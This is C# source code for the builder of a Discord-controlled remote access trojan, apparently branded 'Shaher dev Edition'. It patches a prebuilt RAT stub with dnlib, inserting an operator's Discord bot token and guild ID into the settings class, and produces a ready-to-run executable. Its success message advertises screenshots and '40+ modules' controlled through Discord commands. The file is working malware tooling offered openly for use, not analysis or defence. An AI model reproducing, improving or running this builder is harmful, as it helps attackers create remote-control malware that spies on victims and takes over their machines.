using dnlib.DotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string Bottoken = textBox1.Text;
            string Guildid = textBox2.Text;
            
            if (string.IsNullOrEmpty(Bottoken) || string.IsNullOrEmpty(Guildid))
            {
                MessageBox.Show("Please enter both Bot Token and Guild ID!", "Missing Information", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            string outpath = Environment.CurrentDirectory + "\\Discord-RAT-Shaher-dev.exe";
            string projectRoot = Path.GetFullPath(Path.Combine(Environment.CurrentDirectory, "..\\..\\.."));
            string stub = Path.Combine(projectRoot, "Discord rat", "bin", "Release", "Discord rat.exe");
            string FullName = "Discord_rat.settings";
            
            // Check if the source file exists
            if (!File.Exists(stub))
            {
                MessageBox.Show($"Source file not found!\n\nLooking for: {stub}\n\nMake sure you built the Discord RAT project first using final_build.bat", "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            
            try
            {
                var Assembly = AssemblyDef.Load(stub);
                var Module = Assembly.ManifestModule;
                if (Module != null)
                {
                    var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                    if (Settings != null)
                    {
                        var Constructor = Settings.FindMethod(".cctor");
                        if (Constructor != null)
                        {
                            Constructor.Body.Instructions[0].Operand = Bottoken;
                            Constructor.Body.Instructions[2].Operand = Guildid;
                            
                            Assembly.Write(outpath);
                            MessageBox.Show("✅ Discord RAT - Shaher dev Edition built successfully!\n\n" +
                                          "📁 Output: " + outpath + "\n\n" +
                                          "🎯 Features:\n" +
                                          "• Interactive button interface\n" +
                                          "• Classic text commands (!help, !screenshot, etc.)\n" +
                                          "• 40+ modules included\n\n" +
                                          "🚀 Usage:\n" +
                                          "1. Run the executable\n" +
                                          "2. Type !help in Discord for buttons\n" +
                                          "3. Or use classic commands like !screenshot\n\n" +
                                          "Created by: Shaher dev", 
                                          "Build Successful!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("Could not find constructor in settings class!", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else
                    {
                        MessageBox.Show("Could not find settings class!", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    MessageBox.Show("Could not load module!", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception b)
            {
                MessageBox.Show("BUILD ERROR: " + b.Message + "\n\nMake sure:\n1. Release\\Discord rat.exe exists\n2. You have write permissions\n3. The file is not in use", "Build Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
